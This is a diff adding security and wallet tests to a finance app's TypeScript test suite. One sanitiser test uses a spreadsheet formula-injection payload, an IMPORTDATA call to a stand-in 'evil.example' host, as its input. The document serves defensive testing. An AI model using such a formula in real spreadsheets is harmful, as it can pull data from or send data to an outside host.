@@ -14,11 +14,21 @@ import {
   countElapsedDays,
   formatDisplayDate,
 } from "../src/lib/finance.ts";
-import { buildIncrementalSyncPlan, chunkRows, SHEET_HEADERS } from "../src/lib/google-sheets.ts";
+import {
+  buildIncrementalSyncPlan,
+  chunkRows,
+  decryptToken,
+  encryptToken,
+  SHEET_HEADERS,
+  transactionToSheetRow,
+} from "../src/lib/google-sheets.ts";
+import { checkRateLimit, constantTimeEqual, sanitizeSpreadsheetCell } from "../src/lib/security.ts";
 import { computeDbDiff } from "../src/lib/supabase.ts";
 import {
+  addAccountInDb,
   createInitialDb,
   DEFAULT_EXPENSE_CATEGORIES,
+  deleteAccountInDb,
   deleteCategoryInDb,
   parseLegacyCsv,
   PRESET_CATEGORIES,
@@ -410,7 +420,57 @@ function runTests() {
   assert.deepEqual(dbDelta.deletedTransactionIds, ["2"]);
   assert.equal(dbDelta.clearAllTransactions, false);
 
-  console.log("ALL CORE TESTS PASSED (16/16)");
+  // 17. Token encryption round-trip & constant-time OAuth state compare
+  const encrypted = encryptToken("refresh-token-rahasia-123");
+  assert.notEqual(encrypted, "refresh-token-rahasia-123");
+  assert.equal(decryptToken(encrypted), "refresh-token-rahasia-123");
+  assert.equal(constantTimeEqual("abc-state-123", "abc-state-123"), true);
+  assert.equal(constantTimeEqual("abc-state-123", "xyz-state-999"), false);
+
+  // 18. Spreadsheet & CSV formula injection sanitization
+  assert.equal(sanitizeSpreadsheetCell('=IMPORTDATA("https://evil.example")'), '\'=IMPORTDATA("https://evil.example")');
+  assert.equal(sanitizeSpreadsheetCell("+5000 bonus"), "'+5000 bonus");
+  assert.equal(sanitizeSpreadsheetCell("-parkir"), "'-parkir");
+  assert.equal(sanitizeSpreadsheetCell("Makan siang"), "Makan siang");
+  const safeRow = transactionToSheetRow(
+    { ...txs[1], category: "=SUM(A1:A2)", note: "@evil" },
+    sampleAccounts,
+  );
+  assert.equal(safeRow[3], "'=SUM(A1:A2)");
+  assert.equal(safeRow[6], "'@evil");
+
+  // 19. In-memory rate limiter enforces window cap cleanly
+  const rlKey = `test-rl-${Date.now()}`;
+  assert.equal(checkRateLimit(rlKey, 2, 60_000).ok, true);
+  assert.equal(checkRateLimit(rlKey, 2, 60_000).ok, true);
+  const thirdHit = checkRateLimit(rlKey, 2, 60_000);
+  assert.equal(thirdHit.ok, false);
+  assert.equal(thirdHit.remaining, 0);
+
+  // 20. Client cannot trigger plan changes via computeDbDiff, while aiCreditsRemaining syncs
+  const planAttempt = structuredClone(baseDb);
+  planAttempt.settings.plan = "pro";
+  assert.equal(computeDbDiff(baseDb, planAttempt).settingsChanged, false);
+  const creditSpent = structuredClone(baseDb);
+  creditSpent.settings.aiCreditsRemaining = 19;
+  assert.equal(computeDbDiff(baseDb, creditSpent).settingsChanged, true);
+
+  // 21. Custom wallet add & delete with transaction reassignment & last-wallet protection
+  const accDb = createInitialDb();
+  accDb.transactions = [{ ...txs[1], id: "tx-custom", accountId: "acc-cash" }];
+  assert.equal(addAccountInDb(accDb, "BCA Pribadi", "bank", 2_000_000).ok, true);
+  assert.equal(accDb.accounts.length, 4);
+  assert.equal(addAccountInDb(accDb, "bca pribadi", "bank", 0).ok, false);
+  const addedAcc = accDb.accounts[3];
+  accDb.transactions[0].accountId = addedAcc.id;
+  assert.equal(deleteAccountInDb(accDb, addedAcc.id, "acc-bank").ok, true);
+  assert.equal(accDb.accounts.length, 3);
+  assert.equal(accDb.transactions[0].accountId, "acc-bank");
+  assert.equal(deleteAccountInDb(accDb, "acc-ewallet").ok, true);
+  assert.equal(deleteAccountInDb(accDb, "acc-bank").ok, true);
+  assert.equal(deleteAccountInDb(accDb, "acc-cash").ok, false);
+
+  console.log("ALL CORE TESTS PASSED (21/21)");
 }
 
 runTests();
